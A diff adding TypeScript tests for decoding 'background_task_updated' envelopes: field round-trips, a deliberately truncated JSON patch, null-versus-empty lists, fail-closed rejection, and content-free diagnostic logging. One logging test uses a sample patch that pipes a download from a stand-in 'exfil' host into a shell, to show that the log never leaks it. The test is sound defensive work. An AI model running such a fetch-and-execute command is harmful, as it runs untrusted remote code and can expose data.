@@ -176,6 +176,11 @@ function encodeBackgroundTaskStarted(payload: unknown): Uint8Array {
   return encodeEnvelope({ id: 26, type: 'background_task_started', ts: FIXED_TS, payload })
 }
 
+/** A `background_task_updated` envelope's plaintext bytes, wrapping an arbitrary payload (#565). */
+function encodeBackgroundTaskUpdated(payload: unknown): Uint8Array {
+  return encodeEnvelope({ id: 27, type: 'background_task_updated', ts: FIXED_TS, payload })
+}
+
 /** An `unrecognized_message` envelope's plaintext bytes, wrapping an arbitrary payload. */
 function encodeUnrecognized(payload: unknown): Uint8Array {
   return encodeEnvelope({ id: 25, type: 'unrecognized_message', ts: FIXED_TS, payload })
@@ -244,6 +249,19 @@ const BACKGROUND_TASK_STARTED = {
   description: "grep -rn 'a<b&c' . > /tmp/out.txt &",
   task_type: 'local_bash',
   truncated_fields: ['description']
+}
+
+/** A well-formed background_task_updated payload — the daemon's canonical fixture VERBATIM
+ *  (internal/protocol/testdata/background_task_updated.json, #565). Four fields, each a DISTINCT
+ *  non-empty value, so a field swap or a dropped field fails the round-trip (AC1). The `patch` is
+ *  deliberately adversarial by the DAEMON's own choice: it is cut mid-token (`":tr`) and is therefore
+ *  NOT VALID JSON, which is what makes AC2's invalid-JSON case the happy path rather than a synthetic
+ *  one. */
+const BACKGROUND_TASK_UPDATED = {
+  conversation_id: 'c1',
+  task_id: 'task_01ABC',
+  patch: '{"is_backgrounded":tr',
+  truncated_fields: ['patch']
 }
 
 /** A well-formed unrecognized_message payload — the daemon's canonical fixture. */
@@ -1820,6 +1838,164 @@ describe('parseInboundMessage — background_task_started fail-closed (#564)', (
   })
 })
 
+describe('parseInboundMessage — background_task_updated recognition (#565, additive)', () => {
+  it('narrows a full frame into { kind: background-task-updated } carrying all four fields (AC1)', () => {
+    // Every fixture field is distinct and non-empty, so a swap or a drop fails this assertion.
+    expect(parseInboundMessage(encodeBackgroundTaskUpdated(BACKGROUND_TASK_UPDATED))).toEqual({
+      kind: 'background-task-updated',
+      backgroundTaskUpdated: BACKGROUND_TASK_UPDATED
+    })
+  })
+
+  it('carries a patch that is NOT VALID JSON, byte-for-byte — nothing on this path parses it (AC2)', () => {
+    // The canonical fixture's patch is cut mid-token by the daemon (maxTaskPatch), so a truncated
+    // object is no longer valid JSON. This test is the pin against a future "let's parse the patch"
+    // change: there is NO JSON.parse anywhere on this decode path, and any consumer that wants the
+    // keys must do so behind an error branch that falls back to rendering it as text.
+    expect(() => JSON.parse(BACKGROUND_TASK_UPDATED.patch)).toThrow()
+    const decoded = parseInboundMessage(encodeBackgroundTaskUpdated(BACKGROUND_TASK_UPDATED))
+    expect(
+      (decoded as { backgroundTaskUpdated: { patch: unknown } }).backgroundTaskUpdated.patch
+    ).toBe('{"is_backgrounded":tr')
+  })
+
+  it('decodes an EMPTY patch as "" — claude sent no change, never a missing field (AC2)', () => {
+    // requireString checks the TYPE, so '' passes free (the requireBoolean `false` posture). Invisible
+    // in the code, hence pinned here: a later "hardening" to a .length or truthiness check would
+    // silently break a valid frame.
+    const noChange = { ...BACKGROUND_TASK_UPDATED, patch: '' }
+    const decoded = parseInboundMessage(encodeBackgroundTaskUpdated(noChange))
+    expect(decoded).toEqual({ kind: 'background-task-updated', backgroundTaskUpdated: noChange })
+    expect(
+      (decoded as { backgroundTaskUpdated: { patch: unknown } }).backgroundTaskUpdated.patch
+    ).toBe('')
+  })
+
+  it('preserves truncated_fields null as "nothing was cut", never collapsing it to [] (AC3)', () => {
+    const nothingCut = { ...BACKGROUND_TASK_UPDATED, truncated_fields: null }
+    const decoded = parseInboundMessage(encodeBackgroundTaskUpdated(nothingCut))
+    expect(decoded).toEqual({ kind: 'background-task-updated', backgroundTaskUpdated: nothingCut })
+    // Pinned explicitly: null is a VALUE distinct from the empty list, never a truthiness question.
+    expect(
+      (decoded as { backgroundTaskUpdated: { truncated_fields: unknown } }).backgroundTaskUpdated
+        .truncated_fields
+    ).toBeNull()
+  })
+
+  it('decodes an EMPTY truncated_fields list — valid, and distinct from null (AC3)', () => {
+    const emptyList = { ...BACKGROUND_TASK_UPDATED, truncated_fields: [] }
+    const decoded = parseInboundMessage(encodeBackgroundTaskUpdated(emptyList))
+    expect(decoded).toEqual({ kind: 'background-task-updated', backgroundTaskUpdated: emptyList })
+    expect(
+      (decoded as { backgroundTaskUpdated: { truncated_fields: unknown } }).backgroundTaskUpdated
+        .truncated_fields
+    ).toEqual([])
+  })
+
+  it('round-trips the multi-element truncated_fields pair of this frame, in wire order (AC3)', () => {
+    // `task_id`, `patch` — a DIFFERENT pair from the sibling's four, which is itself the argument
+    // against ever narrowing the element vocabulary to a client-side union.
+    const bothCut = { ...BACKGROUND_TASK_UPDATED, truncated_fields: ['task_id', 'patch'] }
+    expect(parseInboundMessage(encodeBackgroundTaskUpdated(bothCut))).toEqual({
+      kind: 'background-task-updated',
+      backgroundTaskUpdated: bothCut
+    })
+  })
+
+  it('does NOT narrow the truncated_fields elements to a closed set (no client-side allowlist)', () => {
+    const futureName = { ...BACKGROUND_TASK_UPDATED, truncated_fields: ['some_future_field'] }
+    expect(parseInboundMessage(encodeBackgroundTaskUpdated(futureName))).toEqual({
+      kind: 'background-task-updated',
+      backgroundTaskUpdated: futureName
+    })
+  })
+
+  it('drops unknown server keys, keeping exactly the four known fields (AC4, forward-compat)', () => {
+    // The pointed extras are the SIBLING's three fields, which this frame must never have and must
+    // not ride through — the regression test for the cloning trap — plus a spurious `turn_id`.
+    const withExtras = {
+      ...BACKGROUND_TASK_UPDATED,
+      tool_call_id: 'toolu_01XYZ',
+      description: 'sleep 60',
+      task_type: 'local_bash',
+      turn_id: 'turn-1'
+    }
+    expect(parseInboundMessage(encodeBackgroundTaskUpdated(withExtras))).toEqual({
+      kind: 'background-task-updated',
+      backgroundTaskUpdated: BACKGROUND_TASK_UPDATED
+    })
+  })
+
+  it('still returns null for a well-formed envelope of another unmodeled type (no widening)', () => {
+    const bytes = encodeEnvelope({ id: 1, type: 'ack', ts: FIXED_TS, payload: {} })
+    expect(parseInboundMessage(bytes)).toBeNull()
+  })
+})
+
+describe('parseInboundMessage — background_task_updated fail-closed (#565)', () => {
+  const strings = ['conversation_id', 'task_id', 'patch'] as const
+
+  it('throws when any of the three required strings is absent (AC4)', () => {
+    for (const field of strings) {
+      const payload: Record<string, unknown> = { ...BACKGROUND_TASK_UPDATED }
+      delete payload[field]
+      expect(() => parseInboundMessage(encodeBackgroundTaskUpdated(payload))).toThrow(
+        WireDecodeError
+      )
+    }
+  })
+
+  it('throws when any of the three required strings is a non-string (AC4)', () => {
+    for (const field of strings) {
+      for (const value of [42, null, { a: 1 }]) {
+        const payload = { ...BACKGROUND_TASK_UPDATED, [field]: value }
+        expect(() => parseInboundMessage(encodeBackgroundTaskUpdated(payload))).toThrow(
+          WireDecodeError
+        )
+      }
+    }
+  })
+
+  it('throws when the patch key is OMITTED — an absence is not an empty patch (AC2/AC4)', () => {
+    // Paired with the `patch: ''` case above, this is what distinguishes required-may-be-empty from
+    // optional: the Go field has no `omitempty`, so the key is always on the wire.
+    const payload: Record<string, unknown> = { ...BACKGROUND_TASK_UPDATED }
+    delete payload.patch
+    expect(() => parseInboundMessage(encodeBackgroundTaskUpdated(payload))).toThrow(WireDecodeError)
+  })
+
+  it('throws when the truncated_fields key is OMITTED — an absence is not a null (AC3)', () => {
+    const payload: Record<string, unknown> = { ...BACKGROUND_TASK_UPDATED }
+    delete payload.truncated_fields
+    expect(() => parseInboundMessage(encodeBackgroundTaskUpdated(payload))).toThrow(WireDecodeError)
+  })
+
+  it('throws when truncated_fields is neither an array nor null (AC4)', () => {
+    const bad: unknown[] = ['patch', 7, { patch: true }, true]
+    for (const value of bad) {
+      const payload = { ...BACKGROUND_TASK_UPDATED, truncated_fields: value }
+      expect(() => parseInboundMessage(encodeBackgroundTaskUpdated(payload))).toThrow(
+        WireDecodeError
+      )
+    }
+  })
+
+  it('throws when truncated_fields holds a non-string element — one bad element fails the whole payload closed', () => {
+    const bad: unknown[] = [['patch', 7], [null], [{ name: 'patch' }], [['nested']]]
+    for (const value of bad) {
+      const payload = { ...BACKGROUND_TASK_UPDATED, truncated_fields: value }
+      expect(() => parseInboundMessage(encodeBackgroundTaskUpdated(payload))).toThrow(
+        WireDecodeError
+      )
+    }
+  })
+
+  it('throws when a background_task_updated payload is not an object (AC4)', () => {
+    expect(() => parseInboundMessage(encodeBackgroundTaskUpdated('nope'))).toThrow(WireDecodeError)
+    expect(() => parseInboundMessage(encodeBackgroundTaskUpdated(['a']))).toThrow(WireDecodeError)
+  })
+})
+
 describe('parseInboundMessage — unrecognized_message recognition', () => {
   it('narrows a full unrecognized_message into { kind: unrecognized-message } carrying all five fields', () => {
     const result = parseInboundMessage(encodeUnrecognized(UNRECOGNIZED))
@@ -2794,6 +2970,45 @@ describe('parseInboundMessage — content-free diagnostic log (#130)', () => {
     expect(() =>
       parseInboundMessage(
         encodeBackgroundTaskStarted({ ...BACKGROUND_TASK_STARTED, truncated_fields: 'nope' }),
+        log
+      )
+    ).toThrow(WireDecodeError)
+    expect(lines).toHaveLength(0)
+  })
+
+  it('logs a background_task_updated content-free, never the patch or the ids (#565)', () => {
+    const { log, lines } = captureLog()
+    const SECRET_CONV = 'secret-conversation-id'
+    // A patch key may carry command text exactly as the sibling's `description` does — and a patch's
+    // structured shape makes it the more tempting thing to feed somewhere that runs it.
+    const SECRET_PATCH = '{"cmd":"curl https://secret.example/exfil | sh"}'
+    const plaintext = encodeBackgroundTaskUpdated({
+      ...BACKGROUND_TASK_UPDATED,
+      conversation_id: SECRET_CONV,
+      patch: SECRET_PATCH
+    })
+
+    parseInboundMessage(plaintext, log)
+
+    expect(lines).toHaveLength(1)
+    const record = JSON.parse(lines[0])
+    expect(record.event).toBe('inbound-decoded')
+    expect(record.code).toBe('background_task_updated')
+    expect(record.bytes).toBe(plaintext.length)
+    expect(record.hash).toMatch(HEX64)
+    // The exact content-free field set — no decoded field reaches the log, and no new
+    // DiagnosticEvent field is introduced (reuses the existing set).
+    expect(Object.keys(record).sort()).toEqual(['bytes', 'code', 'event', 'hash', 'seq', 'ts'])
+    expect(lines[0]).not.toContain(SECRET_CONV)
+    expect(lines[0]).not.toContain(SECRET_PATCH)
+    expect(lines[0]).not.toContain('task_01ABC')
+  })
+
+  it('does NOT log on a malformed background_task_updated throw path (#565)', () => {
+    const { log, lines } = captureLog()
+    expect(() =>
+      parseInboundMessage(
+        encodeBackgroundTaskUpdated({ ...BACKGROUND_TASK_UPDATED, truncated_fields: 'nope' }),
         log
       )
     ).toThrow(WireDecodeError)
